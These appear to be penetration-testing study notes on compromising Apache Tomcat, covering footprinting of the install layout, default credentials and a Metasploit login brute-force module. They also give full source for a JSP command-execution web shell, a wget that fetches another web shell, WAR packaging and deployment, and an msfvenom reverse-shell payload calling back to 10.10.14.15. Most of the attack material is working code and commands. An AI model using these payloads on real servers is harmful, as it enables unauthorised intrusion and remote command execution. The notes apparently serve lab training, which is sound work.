
## Footprinting

- the general folder structure of a Tomcat installation

```sh
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

- Each folder inside `webapps` is expected to have the following structure.

```sh
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class 
```

- We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat`, `admin:admin`

## Tomcat Manager - Login Brute Force

- we can use this console module : 

```sh
scanner/http/tomcat_mgr_login
```

## Tomcat Manager - WAR File Upload

- A JSP web shell

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        String[] cmdArray = {"/bin/sh", "-c", request.getParameter("cmd")};
		Process p = Runtime.getRuntime().exec(cmdArray);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

- OR

```sh
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

```sh
 zip -r backup.war cmd.jsp 
```

- then Click on `Browse` to select the .war file and then click on `Deploy`

![t](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/mgr_deploy.png)

- we can also use `msfvenom` 

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

